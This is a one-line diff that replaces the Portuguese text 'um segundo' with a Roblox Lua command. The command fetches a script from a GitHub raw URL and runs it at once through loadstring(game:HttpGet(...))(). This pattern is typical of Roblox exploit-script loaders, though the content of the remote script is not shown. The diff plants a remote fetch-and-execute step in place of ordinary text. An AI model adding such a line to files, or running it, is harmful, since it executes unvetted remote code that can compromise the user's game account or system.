@@ -1,1 +1,1 @@
-um segundo
+loadstring(game:HttpGet("https://raw.githubusercontent.com/SeilaNomeFoda/Oo/refs/heads/main/ZinazcxTu.lua"))()
